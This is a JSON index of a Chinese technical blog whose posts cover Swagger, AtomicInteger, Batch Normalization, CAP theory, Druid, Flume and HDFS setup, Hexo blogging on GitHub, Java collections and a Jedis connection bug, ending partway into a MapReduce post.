{"pages":[],"posts":[{"title":"API文档工具-Swagger的集成","text":"最近安装了API文档工具swagger，因为Github上已有详细安装教程，且安装过程中没有碰到大的阻碍，所以此文仅对这次安装做一份大致记录 相关网站Swagger 官方地址：http://swagger.wordnik.com Github安装详解【springmvc集成swagger】:https://github.com/rlogiacco/swagger-springmvc 网上安装教程【可配合Github安装教程使用】：http://www.jianshu.com/p/5cfbe62a1569http://blog.csdn.net/fengspg/article/details/43705537 Swagger注解详解：https://github.com/swagger-api/swagger-core/wiki/Annotations#apimodelhttp://www.cnblogs.com/java-zhao/p/5348113.html 【springboot + swagger】 API文档工具 RAML、Swagger和Blueprint三者的比较：http://www.cnblogs.com/softidea/p/5728952.html 错误记录配置完并成功启动项目后，报如下错误： 原因：在修改配置文件index.html时，ip和端口中间多了一个斜杠，去掉斜杠即可。 PS：果不是以上原因造成，请移步 https://github.com/swagger-api/swagger-ui 查看此错误详细介绍:","link":"/2016/09/10/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/"},{"title":"AtomicInteger的使用","text":"JDK API 1.7相关介绍可以用原子方式更新的 int 值。有关原子变量属性的描述，请参阅 java.util.concurrent.atomic 包规范。AtomicInteger 可用在应用程序中（如以原子方式增加的计数器），并且不能用于替换 Integer。但是，此类确实扩展了 Number，允许那些处理基于数字类的工具和实用工具进行统一访问。 AtomicInteger 是线程安全的，多线程对同一个数加100次，结果一定是100. 相关代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import java.util.concurrent.CountDownLatch;import java.util.concurrent.atomic.AtomicInteger;import javax.annotation.PostConstruct;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;import org.springframework.stereotype.Component;/** * @ClassName: AtomicIntegerHandle * @Description: AtomicInteger的使用 * @author wasim * @create at 2015-8-12 下午8:44:51 * */@Componentpublic class AtomicIntegerHandle { @Autowired ThreadPoolTaskExecutor executor; @PostConstruct public void handleQuestionKnowledge(){ AtomicInteger atomicInteger = new AtomicInteger(); int round = 15; //要执行的线程总数 //导出文件 executor.execute(new ExportStats(atomicInteger, round)); //导出文件前，需要先循环下面12个线程 for(int i=0;i&lt;round;i++){ executor.execute(new similarKnowledgeHandle(atomicInteger)); } } public class similarKnowledgeHandle implements Runnable{ AtomicInteger atomicInteger; public similarKnowledgeHandle(AtomicInteger atomicInteger) { this.atomicInteger =atomicInteger; } @Override public void run() { System.out.println(&quot;do some thing....&quot;); atomicInteger.getAndIncrement(); System.out.println(atomicInteger.get()); //显示当前计数 } } public class ExportStats implements Runnable{ AtomicInteger atomicInteger; int round; public ExportStats(AtomicInteger atomicInteger, int round) { this.atomicInteger =atomicInteger; this.round = round; } @Override public void run() { try { boolean flag = true; while(flag){ if(atomicInteger.get() == round){ flag = false; System.out.println(&quot;预处理完成,开始执行相关...&quot;); } else { System.out.println(&quot;wait...&quot;); Thread.sleep(1000); } } } catch (Exception e) { e.printStackTrace(); } } }}","link":"/2016/04/16/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"Batch Normalization 批标准化","text":"简介批标准化（Batch Normalization，经常简称为 BN）会使参数搜索问题变得很容易，使神经网络对超参数的选择更加稳定，超参数的范围会更庞大，工作效果也很好，也会使训练更容易。 之前，我们对输入特征 X 使用了标准化处理。我们也可以用同样的思路处理隐藏层的激活值 $a^{[l]}$，以加速 $W^{[l+1]}$和 $b^{[l+1]}$ 的训练。在实践中，经常选择标准化 $Z^{[l]}$： \\mu = \\frac{1}{m} \\sum_i z^{(i)}\\sigma^2 = \\frac{1}{m} \\sum_i {(z_i - \\mu)}^2z_{norm}^{(i)} = \\frac{z^{(i)} - \\mu}{\\sqrt{\\sigma^2 + \\epsilon}}其中，m 是单个 mini-batch 所包含的样本个数，ϵ 是为了防止分母为零，通常取 $10^{-8}$。 这样，我们使得所有的输入 $z^{(i)}$ 均值为 0，方差为 1。但我们不想让隐藏层单元总是含有平均值 0 和方差 1，也许隐藏层单元有了不同的分布会更有意义。因此，我们计算 \\tilde z^{(i)} = \\gamma z^{(i)}_{norm} + \\beta其中，γ 和 β 都是模型的学习参数，所以可以用各种梯度下降算法来更新 γ 和 β 的值，如同更新神经网络的权重一样。 通过对 γ 和 β 的合理设置，可以让 z~(i)的均值和方差为任意值。这样，我们对隐藏层的 $z^{(i)}$ 进行标准化处理，用得到的 $\\tilde z^{(i)}$ 替代 $z^{(i)}$。 设置 γ 和 β 的原因是，如果各隐藏层的输入均值在靠近 0 的区域，即处于激活函数的线性区域，不利于训练非线性神经网络，从而得到效果较差的模型。因此，需要用 γ 和 β 对标准化后的结果做进一步处理。 将 BN 应用于神经网络对于 L 层神经网络，经过 Batch Normalization 的作用，整体流程如下： 实际上，Batch Normalization 经常使用在 mini-batch 上，这也是其名称的由来。 使用 Batch Normalization 时，因为标准化处理中包含减去均值的一步，因此 b 实际上没有起到作用，其数值效果交由 β 来实现。因此，在 Batch Normalization 中，可以省略 b 或者暂时设置为 0。 在使用梯度下降算法时，分别对 $W^{[l]}$，$β^{[l]}$和 $γ^{[l]}$进行迭代更新。除了传统的梯度下降算法之外，还可以使用之前学过的动量梯度下降、RMSProp 或者 Adam 等优化算法。 BN 有效的原因Batch Normalization 效果很好的原因有以下两点： 通过对隐藏层各神经元的输入做类似的标准化处理，提高神经网络训练速度； 可以使前面层的权重变化对后面层造成的影响减小，整体网络更加健壮。 关于第二点，如果实际应用样本和训练样本的数据分布不同（例如，橘猫图片和黑猫图片），我们称发生了“Covariate Shift”。这种情况下，一般要对模型进行重新训练。Batch Normalization 的作用就是减小 Covariate Shift 所带来的影响，让模型变得更加健壮，鲁棒性（Robustness）更强。 即使输入的值改变了，由于 Batch Normalization 的作用，使得均值和方差保持不变（由 γ 和 β 决定），限制了在前层的参数更新对数值分布的影响程度，因此后层的学习变得更容易一些。Batch Normalization 减少了各层 W 和 b 之间的耦合性，让各层更加独立，实现自我训练学习的效果。 另外，Batch Normalization 也起到微弱的正则化（regularization）效果。因为在每个 mini-batch 而非整个数据集上计算均值和方差，只由这一小部分数据估计得出的均值和方差会有一些噪声，因此最终计算出的 $\\tilde z^{(i)}$ 也有一定噪声。类似于 dropout，这种噪声会使得神经元不会再特别依赖于任何一个输入特征。 因为 Batch Normalization 只有微弱的正则化效果，因此可以和 dropout 一起使用，以获得更强大的正则化效果。通过应用更大的 mini-batch 大小，可以减少噪声，从而减少这种正则化效果。 最后，不要将 Batch Normalization 作为正则化的手段，而是当作加速学习的方式。正则化只是一种非期望的副作用，Batch Normalization 解决的还是反向传播过程中的梯度问题（梯度消失和爆炸）。 测试时的 Batch NormalizationBatch Normalization 将数据以 mini-batch 的形式逐一处理，但在测试时，可能需要对每一个样本逐一处理，这样无法得到 μ 和 $σ^2$。 理论上，我们可以将所有训练集放入最终的神经网络模型中，然后将每个隐藏层计算得到的 $μ^{[l]}$和 $σ^{2[l]}$直接作为测试过程的 μ 和 σ 来使用。但是，实际应用中一般不使用这种方法，而是使用之前学习过的指数加权平均的方法来预测测试过程单个样本的 μ 和 $σ^2$。 对于第 l 层隐藏层，考虑所有 mini-batch 在该隐藏层下的 $μ^{[l]}$和 $σ^{2[l]}$，然后用指数加权平均的方式来预测得到当前单个样本的 $μ^{[l]}$和 $σ^{2[l]}$。这样就实现了对测试过程单个样本的均值和方差估计。","link":"/2017/12/19/Batch%20Normalization%20%E6%89%B9%E6%A0%87%E5%87%86%E5%8C%96/"},{"title":"CAP原理、一致性模型、BASE理论和ACID特性","text":"CAP原理在理论计算机科学中，CAP定理（CAP theorem），又被称作布鲁尔定理（Brewer’s theorem），它指出对于一个分布式计算系统来说，不可能同时满足以下三点： 一致性（Consistence）分布式系统中的所有数据备份，在同一时刻是否同样的值。（等同于所有节点访问同一份最新的数据副本） 可用性（Availability）集群出现故障节点后，是否还能响应客户端的读写请求。（对数据更新具备高可用性） 分区容忍性（Partition tolerance）实际中通信产生延时。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C点和A点之间做出选择。 CAP原理指的是，CAP的三个要素最多只能同时实现两点，不可能三者兼顾。因此在进行分布式架构设计时，必须做出取舍。而对于分布式数据系统，分区容忍性是基本要求，否则就失去了价值。 因此设计分布式数据系统，就是在一致性和可用性之间取一个平衡。对于大多数web应用，其实并不需要强一致性，因此牺牲一致性而换取高可用性，是目前多数分布式数据库产品的方向。 当然，并不是完全不管数据的一致性。牺牲一致性，只是不再要求关系型数据库中的强一致性，而是只要系统能达到最终一致性即可，考虑到客户体验，这个最终一致的时间窗口，要尽可能的对用户透明，也就是需要保障“用户感知到的一致性”。通常是通过数据的多份异步复制来实现系统的高可用和数据的最终一致性的，“用户感知到的一致性”的时间窗口则取决于数据复制到一致状态的时间。 一致性模型强一致性当更新操作完成之后，任何多个后续进程或者线程的访问都会返回最新的更新过的值。这种是对用户最友好的，就是用户上一次写什么，下一次就保证能读到什么。但是这种实现对性能影响较大。 弱一致性系统并不保证续进程或者线程的访问都会返回最新的更新过的值。系统在数据写入成功之后，不承诺立即可以读到最新写入的值，也不会具体的承诺多久之后可以读到。但会尽可能保证在某个时间级别（比如秒级别）之后，可以让数据达到一致性状态。 最终一致性弱一致性的特定形式。系统保证在没有后续更新的前提下，系统最终返回上一次更新操作的值。在没有故障发生的前提下，不一致窗口的时间主要受通信延迟，系统负载和复制副本的个数影响。DNS是一个典型的最终一致性系统。 最终一致性模型的变种 因果一致性：如果A进程在更新之后向B进程通知更新的完成，那么B的访问操作将会返回更新的值。如果没有因果关系的C进程将会遵循最终一致性的规则。 读己所写一致性：因果一致性的特定形式。一个进程总可以读到自己更新的数据。 会话一致性：读己所写一致性的特定形式。进程在访问存储系统同一个会话内，系统保证该进程读己之所写。 单调读一致性：如果一个进程已经读取到一个特定值，那么该进程不会读取到该值以前的任何值。 单调写一致性：系统保证对同一个进程的写操作串行化。 上述最终一致性的不同方式可以进行组合，例如单调读一致性和读己之所写一致性就可以组合实现。并且从实践的角度来看，这两者的组合，读取自己更新的 数据，和一旦读取到最新的版本不会再读取旧版本，对于此架构上的程序开发来说，会少很多额外的烦恼。 BASE理论——CAP理论的延伸BASE理论是对CAP理论的延伸，核心思想是即使无法做到强一致性（Strong Consistency，CAP的一致性就是强一致性），但应用可以采用适合的方式达到最终一致性（Eventual Consitency）。Redis等众多系统构建于这个理论之上。 基本可用（Basically Available）基本可用是指分布式系统在出现故障的时候，允许损失部分可用性，即保证核心可用。电商大促时，为了应对访问量激增，部分用户可能会被引导到降级页面，服务层也可能只提供降级服务。这就是损失部分可用性的体现。 软状态（ Soft State）软状态是指允许系统存在中间状态，而该中间状态不会影响系统整体可用性。分布式存储中一般一份数据至少会有三个副本，允许不同节点间副本同步的延时就是软状态的体现。mysql replication的异步复制也是一种体现。 最终一致性（ Eventual Consistency）最终一致性是指系统中的所有数据副本经过一定时间后，最终能够达到一致的状态。弱一致性和强一致性相反，最终一致性是弱一致性的一种特殊情况。 BASE和ACID的区别与联系ACID，是指数据库管理系统（DBMS）在写入/更新资料的过程中，为保证事务（transaction）是正确可靠的，所必须具备的四个特性：原子性（atomicity，或称不可分割性）、一致性（consistency）、隔离性（isolation，又称独立性）、持久性（durability）。 原子性：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。 一致性：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。 隔离性：数据库允许多个并发事务同时对齐数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。 持久性：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。 ACID是传统数据库常用的设计理念, 追求强一致性模型。BASE支持的是大型分布式系统，提出通过牺牲强一致性获得高可用性。 ACID和BASE代表了两种截然相反的设计哲学，分处【一致性-可用性】分布图谱的两极。","link":"/2016/10/21/CAP%E5%8E%9F%E7%90%86%E3%80%81%E4%B8%80%E8%87%B4%E6%80%A7%E6%A8%A1%E5%9E%8B%E3%80%81BASE%E7%90%86%E8%AE%BA%E5%92%8CACID%E7%89%B9%E6%80%A7/"},{"title":"Druid","text":"Druid是阿里巴巴的开源项目，它在监控、可扩展性、稳定性和性能方面，相对于其他数据库连接池都有较明显的优势 网站官网介绍：https://github.com/alibaba/druid/wiki/常见问题阿里巴巴开源项目Druid负责人温少访谈：http://www.iteye.com/magazines/90配置方法如下：http://blog.csdn.net/pk490525/article/details/12621649 问题实践遇到的问题：官网下载 druid-1.0.17.jar，引入并配置好相关文件后，启动报了一个警告 查看源码如下： 原因：应该是mysql驱动太老了，因为下载的druid-1.0.17.jar是16年最新发布的，去mysql官网下载最新jar包后，问题解决 运行结果启动后项目，http://localhost:8080/ichargerclouds/druid/index.html监控页面运行如下：","link":"/2016/04/24/Druid/"},{"title":"Flume简介及安装","text":"Hadoop业务的大致开发流程以及Flume在业务中的地位： 从Hadoop的业务开发流程图中可以看出，在大数据的业务处理过程中，对于数据的采集是十分重要的一步，也是不可避免的一步，从而引出我们本文的主角—Flume。 Flume概念flume是分布式的日志收集系统，它将各个服务器中的数据收集起来并送到指定的地方去，比如说送到图中的HDFS，简单来说flume就是收集日志的。 Event概念在这里有必要先介绍一下flume中event的相关概念：flume的核心是把数据从数据源(source)收集过来，在将收集到的数据送到指定的目的地(sink)。为了保证输送的过程一定成功，在送到目的地(sink)之前，会先缓存数据(channel),待数据真正到达目的地(sink)后，flume在删除自己缓存的数据。 在整个数据的传输的过程中，流动的是event，即事务保证是在event级别进行的。那么什么是event呢？—–event将传输的数据进行封装，是flume传输数据的基本单位，如果是文本文件，通常是一行记录，event也是事务的基本单位。event从source，流向channel，再到sink，本身为一个字节数组，并可携带headers(头信息)信息。event代表着一个数据的最小完整单元，从外部数据源来，向外部的目的地去。 为了方便大家理解，给出一张event的数据流向图： 一个完整的event包括：event headers、event body、event信息(即文本文件中的单行记录)，其中event信息就是flume收集到的日记记录。 Flume架构flume之所以这么神奇，是源于它自身的一个设计，这个设计就是agent，agent本身是一个Java进程，运行在日志收集节点—所谓日志收集节点就是服务器节点。 agent里面包含3个核心的组件：source—-&gt;channel—–&gt;sink,类似生产者、仓库、消费者的架构。 source：source组件是专门用来收集数据的，可以处理各种类型、各种格式的日志数据,包括avro、thrift、exec、jms、spooling directory、netcat、sequence generator、syslog、http、legacy、自定义。 channel：source组件把数据收集来以后，临时存放在channel中，即channel组件在agent中是专门用来存放临时数据的——对采集到的数据进行简单的缓存，可以存放在memory、jdbc、file等等。 sink：sink组件是用于把数据发送到目的地的组件，目的地包括hdfs、logger、avro、thrift、ipc、file、null、Hbase、solr、自定义。 Flume运行机制flume的核心就是一个agent，这个agent对外有两个进行交互的地方，一个是接受数据的输入——source，一个是数据的输出sink，sink负责将数据发送到外部指定的目的地。source接收到数据之后，将数据发送给channel，chanel作为一个数据缓冲区会临时存放这些数据，随后sink会将channel中的数据发送到指定的地方—-例如HDFS等，注意：只有在sink将channel中的数据成功发送出去之后，channel才会将临时数据进行删除，这种机制保证了数据传输的可靠性与安全性。 Flume广义用法flume之所以这么神奇—-其原因也在于flume可以支持多级flume的agent，即flume可以前后相继，例如sink可以将数据写到下一个agent的source中，这样的话就可以连成串了，可以整体处理了。flume还支持扇入(fan-in)、扇出(fan-out)。所谓扇入就是source可以接受多个输入，所谓扇出就是sink可以将数据输出多个目的地destination中。 安装配置1、安装下载地址：http://mirrors.hust.edu.cn/apache/flume/1.7.0/ 2、解压缩12tar -zxvf apache-flume-1.7.0-bin.tar.gz -C /datamv apache-flume-1.7.0-bin flume 3、配置环境变量123456vim /etc/profileexport FLUME_HOME=/data/flumeexport PATH=$PATH:$FLUME_HOME/binsource /etc/profile 4、验证是否安装成功123456[root@iZwz9b62gfdv0s2e67yo8kZ /]# flume-ng versionFlume 1.7.0Source code repository: https://git-wip-us.apache.org/repos/asf/flume.gitRevision: 511d868555dd4d16e6ce4fedc72c2d1454546707Compiled by bessbd on Wed Oct 12 20:51:10 CEST 2016From source with checksum 0d21b3ffdc55a07e1d08875872c00523 链接相关大数据进阶计划http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ Flume下载地址http://mirrors.hust.edu.cn/apache/flume/1.7.0/","link":"/2017/02/27/Flume%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%AE%89%E8%A3%85/"},{"title":"HDFS运行原理","text":"简介HDFS（Hadoop Distributed File System ）Hadoop分布式文件系统。是根据google发表的论文翻版的。论文为GFS（Google File System）Google 文件系统（中文，英文）。 HDFS有很多特点： 运行在廉价的机器上。 保存多个副本，且提供容错机制，副本丢失或宕机自动恢复。默认存3份。 适合大数据的处理。多大？多小？HDFS默认会将文件分割成block，64M为1个block。然后将block按键值对存储在HDFS上，并将键值对的映射存到内存中。如果小文件太多，那内存的负担会很重。 如上图所示，HDFS也是按照Master和Slave的结构。分NameNode、SecondaryNameNode、DataNode这几个角色。 NameNode：是Master节点，是大领导。管理数据块映射；处理客户端的读写请求；配置副本策略；管理HDFS的名称空间；SecondaryNameNode：是一个小弟，分担大哥namenode的工作量；是NameNode的冷备份；合并fsimage和fsedits然后再发给namenode。DataNode：Slave节点，奴隶，干活的。负责存储client发来的数据块block；执行数据块的读写操作。热备份：b是a的热备份，如果a坏掉。那么b马上运行代替a的工作。冷备份：b是a的冷备份，如果a坏掉。那么b不能马上代替a工作。但是b上存储a的一些信息，减少a坏掉之后的损失。fsimage：元数据镜像文件（文件系统的目录树。）edits：元数据的操作日志（针对文件系统做的修改操作记录） namenode内存中存储的是=fsimage+edits。SecondaryNameNode负责定时默认1小时，从namenode上，获取fsimage和edits来进行合并，然后再发送给namenode。减少namenode的工作量。 写操作 有一个文件FileA，100M大小。Client将FileA写入到HDFS上。HDFS按默认配置。HDFS分布在三个机架上Rack1，Rack2，Rack3。 A、Client将FileA按64M分块。分成两块，block1和Block2; B、Client向nameNode发送写数据请求，如图蓝色虚线①———&gt;。 C、NameNode节点，记录block信息。并返回可用的DataNode，如粉色虚线②————-&gt;。 Block1: host2,host1,host3 Block2: host7,host8,host4 原理：（1）NameNode具有RackAware机架感知功能，这个可以配置。（2）若client为DataNode节点，那存储block时，规则为：副本1，同client的节点上；副本2，不同机架节点上；副本3，同第二个副本机架的另一个节点上；其他副本随机挑选。（3）若client不为DataNode节点，那存储block时，规则为：副本1，随机选择一个节点上；副本2，不同副本1，机架上；副本3，同副本2相同的另一个节点上；其他副本随机挑选。 D、client向DataNode发送block1；发送过程是以流式写入。流式写入过程：（1）将64M的block1按64k的package划分;（2）然后将第一个package发送给host2;（3）host2接收完后，将第一个package发送给host1，同时client想host2发送第二个package；（4）host1接收完第一个package后，发送给host3，同时接收host2发来的第二个package。（5）以此类推，如图红线实线所示，直到将block1发送完毕。（6）host2,host1,host3向NameNode，host2向Client发送通知，说“消息发送完了”。如图粉红实线所示。（7）client收到host2发来的消息后，向namenode发送消息，说我写完了。这样就真完成了。如图黄色粗实线（8）发送完block1后，再向host7，host8，host4发送block2，如图蓝色实线所示。（9）发送完block2后，host7,host8,host4向NameNode，host7向Client发送通知，如图浅绿色实线所示。（10）client向NameNode发送消息，说我写完了，如图黄色粗实线。。。这样就完毕了。 通过分析写过程，我们可以了解到：（1）写1T文件，我们需要3T的存储，3T的网络流量贷款。（2）在执行读或写的过程中，NameNode和DataNode通过HeartBeat进行保存通信，确定DataNode活着。如果发现DataNode死掉了，就将死掉的DataNode上的数据，放到其他节点去。读取时，要读其他节点去。（3）挂掉一个节点，没关系，还有其他节点可以备份；甚至，挂掉某一个机架，也没关系；其他机架上，也有备份。 读操作 读操作就简单一些了，如图所示，client要从datanode上，读取FileA。而FileA由block1和block2组成。 那么，读操作流程为： A、client向namenode发送读请求。 B、namenode查看Metadata信息，返回fileA的block的位置。block1：host2,host1,host3block2：host7,host8,host4 C、block的位置是有先后顺序的，先读block1，再读block2。而且block1去host2上读取；然后block2，去host7上读取； 上面例子中，client位于机架外，那么如果client位于机架内某个DataNode上，例如,client是host6。那么读取的时候，遵循的规律是：优选读取本机架上的数据。 HDFS常用命令1、hadoop fs12345678910111213hadoop fs -ls /hadoop fs -lsrhadoop fs -mkdir /user/hadoophadoop fs -put a.txt /user/hadoop/hadoop fs -get /user/hadoop/a.txt /hadoop fs -cp src dsthadoop fs -mv src dsthadoop fs -cat /user/hadoop/a.txthadoop fs -rm /user/hadoop/a.txthadoop fs -rmr /user/hadoop/a.txthadoop fs -text /user/hadoop/a.txthadoop fs -copyFromLocal localsrc dst 与hadoop fs -put功能类似。hadoop fs -moveFromLocal localsrc dst 将本地文件上传到hdfs，同时删除本地文件。 2、hadoop fsadmin123hadoop dfsadmin -reporthadoop dfsadmin -safemode enter | leave | get | waithadoop dfsadmin -setBalancerBandwidth 1000 3、hadoop fsck 4、start-balancer.sh 本文转至：http://www.weixuehao.com/archives/596","link":"/2017/02/20/HDFS%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/"},{"title":"Github+Hexo,搭建专属网站","text":"前言记得从大二开始，就一直想搭个专属网站，当时使劲抠页面【前端页面是从QQ空间抠的，现在想抠估计没这么容易了】，写代码，忙活半天才把程序弄好。 可惜最终项目还是没上线，因为当时有两问题绕不开 需要购买服务器【服务器太贵，现在便宜的阿里云服务器每月都需100左右】。 需要运维管理【麻烦且危险，服务器宕了可能丢失数据】。 最近了解到 github + hexo 能完美解决上述问题，啥也不说了，直接开干 ^.^ 相关网站搭建教程网上比比皆是，此处不累赘，下面是搭建过程中用到的相关网站： hexo中文网站：https://hexo.io/zh-cn/docs/hexo主题模板：https://www.zhihu.com/question/24422335hexo+github搭建过程：http://www.jianshu.com/p/df3edc4286d2Markdown 语法说明：http://www.appinn.com/markdown/github绑定域名：http://www.jianshu.com/p/1d427e888dda HEXO如何优化部署及管理问题：使用hexo时，如果本地文件丢失或者想在其他电脑上修改博客怎么办？方案：简单地说，每个想建立GitHub Pages的仓库，至少两个分支，一个hexo分支用来存放网站的原始文件，一个master分支用来存放生成的静态网页。 步骤如下:1、创建仓库，Wasim37.github.io；2、创建两个分支：master 与 hexo；3、设置hexo为默认分支（因为我们只需要手动管理这个分支上的Hexo网站文件）；4、使用git clone git@github.com:Wasim37/Wasim37.github.io.git拷贝仓库；5、在本地Wasim37.github.io文件夹下通过Git bash依次执行npm install hexo、hexo init、npm install 和 npm install hexo-deployer-git（此时当前分支应显示为hexo）;6、修改_config.yml中的deploy参数，分支应为master；7、依次执行git add .、git commit -m “…”、git push origin hexo提交网站相关的文件；8、执行hexo generate -d生成网站并部署到GitHub上。 本地修改1、在本地对博客进行修改（添加新博文、修改样式等等）后，通过下面的流程进行管理：依次执行git add .、git commit -m “…”、git push origin hexo指令将改动推送到GitHub（此时当前分支应为hexo）；2、然后才执行hexo generate -d发布网站到master分支上。 本地资料丢失或者想在其他电脑上修改博客1、使用git clone git@github.com:Wasim37/Wasim37.github.io.git拷贝仓库（默认分支为hexo）；2、在本地新拷贝的Wasim37.github.io文件夹下通过Git bash依次执行下列指令：npm install hexo、npm install、npm install hexo-deployer-git（记得，不需要hexo init这条指令）。 安装错误记录执行hexo d出现以下错误 解决方法：_config.yml ——&gt; deploy ——&gt; repositoryhttps://github.com/{username}/{username}.github.io.git 修改为git@github.com:{username}/{username}.github.io.git 文章编辑工具文章编辑工具一开始我使用的是subline，但因为没有快捷键及预览功能，后来选择了MarkdownPad。可最近发现新版的有道云笔记支持Markdown语法，果断换成了有道。因为有道除了编辑功能，我更看重的是它对文章的二次备份. 有道云笔记MarkDown使用教程： http://note.youdao.com/iyoudao/?p=1895 其次文章图片如果不想托管在github，可以使用七牛云存储等图床工具。 模板自定义我使用的博客主题为 icarus，对比可以发现，我在展示细节上做了一些自己的修改。 比如页面展示可以分为左中右三个区域，分别为profile-column，main-column和sidebar-column。源代码三者宽度比例为3:7:3。为了突出正文，我改为了 2.3：8.4：2.3。源代码文件位置为：icarus\\source\\css\\ _variables.styl 文章目录icarus主题模板的文章详细展示默认是不带有文章目录的如果需要添加文章目录，可以参考http://www.jianshu.com/p/72408c410904 icarus主题添加文章目录，修改themes\\icarus\\layout\\common\\article.ejs文件即可。123&lt;% if (!index &amp;&amp; post.toc) { %&gt;修改为&lt;% if (!index &amp;&amp; post.toc != false) { %&gt; 每篇文章可以选择是否开放目录功能123456...title: Github+Hexo,搭建专属网站categories: - demotoc: false...","link":"/2016/06/01/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/"},{"title":"Java集合类从属关系","text":"1、集合关系图 Java的集合分为了四类：List Set Queue Map，每类都有不同的实现，有基于数组实现的，有基于链表实现的，有基于xx树实现的，不同的实现虽在功能上可以相互替代但都有各自的应用场景，如基于数组的实现擅长快速遍历，基于链表的实现擅长随机写，基于树的实现可排序等等。 JDK1.5及以后还添加了很多实用的功能，如ConcurrentMap、CopyOnWriteArray、ListBlockingQueue、BlockingDeque、CopyOnWriteArraySet等等，另外，Collections工具类也提供了很多方便的API，如 synchronizedCollection、binarySearch、checkedCollection、copy、indexOfSubList、reverse、singletonList等等，这给我们提供了非常多的选择。 多线程下使用，需要保证线程安全，读操作远大与写操作，例如缓存系统，使用CopyOnWriteArray…也许会是不错的选择，此外Concurrent…也不错。如果在多线程间还需要协作通信等，那么阻塞队列BlockingQueue、BlockingDeque（双端队列，既可以在队列的前端进行插入删除操作，也可以在队列的后端进行插入删除操作，具有队列和栈的特征）会是最合适的选择。如果这还不够，可以使用带优先级的PriorityBlockingQueue更秒的地方我们还可以使用DelayQueue延迟队列，如果你的创造力够强的话，用DelayQueue来实现一些超时管理（如Session超时处理、请求超时处理）会有非常优雅和奇妙的效果 。 如果不会涉及多线程并发访问，如方法内部、同步访问区等，如果有随机写的需求可以考虑LinkedList或LinkedHashSet如果需要快速检索元素是否已经存在于集合内可以考虑使用HashMap、HashSet如果我们需要非常频繁且高效的遍历则应该采用ArrayList如果我们需要排序，那么就必需要选择TreeMap、TreeSet喽另外，LinkedList同时实现了List、Deque、Queue接口，用其来实现Stack也是可以的。 2、《编程思想》相关概念 3、集合类为什么也称为容器类？","link":"/2016/06/11/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/"},{"title":"Jedis-returnResource使用注意事项","text":"遇到过这样一个严重问题：发布的项目不知从什么时候开始，每月会出现一两次串号问题。串号现象指的是，用户用账号A登录系统，然后某个时间，登录账号自动变成了B。串号出现的时间不定，测试平台难以重现，且后台检测不到错误，难以定位。当时各种排查，最后发现问题果然是出在缓存redis上，JedisPool使用有问题。 JedisPool使用注意事项：1、每次从pool获取资源后，一定要try-finally释放，否则会出现很多莫名其妙的错误。2、资源释放不能一致使用returnBrokenResource【项目问题就出在第二条注意事项上】。 相关代码代码修改前大致如下:12345public void closeResource(Jedis jedis) { if (null != jedis) { jedisPool.returnResource(jedis); } } 代码修改后大致如下【isOK正常设为true，捕获到异常如JedisConnectionException时传入false】:12345678910public void closeResource(Jedis jedis, boolean isOK) { if (null != jedis) { if(!isOK){ LOG.error(&quot;do some things..&quot;); jedisPool.returnBrokenResource(jedis); }else{ jedisPool.returnResource(jedis); } } }相关源码： 分析源代码，可以知道本来应该执行returnBrokenResourceObject方法，结果却执行了returnResourceObject，并且执行returnResourceObject过程中没有报错。 具体原因应该就在方法体里面，可惜点进去并没有分析出具体是哪几行代码导致了串号的出现 = =!不过当时项目return方面进行了修改后，错误确实没有再出现。 下面这篇文章也讲解了returnSource的相关注意事项，大家可以参考下http://www.codeweblog.com/jedis-returnresource使用注意事项/ PS：当时项目使用的是Jedis2.7.0，不用通过图片1可以发现Jedis3.0后，returnResource就不使用了，建议用close替换。即：jedisPool.returnResource(jedis) —-&gt; jedis.close();","link":"/2016/06/18/Jedis-returnResource%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"},{"title":"MapReduce详解","text":"MapReduce简介MapReduce是一种编程模型，用于大规模数据集（大于1TB）的并行运算。概念”Map（映射）”和”Reduce（归约）”，是它们的主要思想。 MapReduce极大地方便了编程人员在不会分布式并行编程的情况下，将自己的程序运行在分布式系统上。 WordCount单词计数单词计数是最简单也是最能体现MapReduce思想的程序之一，可以称为MapReduce版”Hello World”。词计数主要完成功能是：统计一系列文本文件中每个单词出现的次数。 以下是WordCount过程图解，可以先大致浏览下，然后结合下文的Mapper和Reduce任务详解进行理解。 分析MapReduce执行过程MapReduce运行的时候，会通过Mapper运行的任务读取HDFS中的数据文件，然后调用自己的方法，处理数据，最后输出。Reducer任务会接收Mapper任务输出的数据，作为自己的输入数据，调用自己的方法，最后输出到HDFS的文件中。整个流程如图： Mapper任务详解每个Mapper任务是一个java进程，它会读取HDFS中的文件，解析成很多的键值对，经过我们覆盖的map方法处理后，转换为很多的键值对再输出。整个Mapper任务的处理过程又可以分为以下几个阶段，如图所示。 在上图中，把Mapper任务的运行过程分为六个阶段。 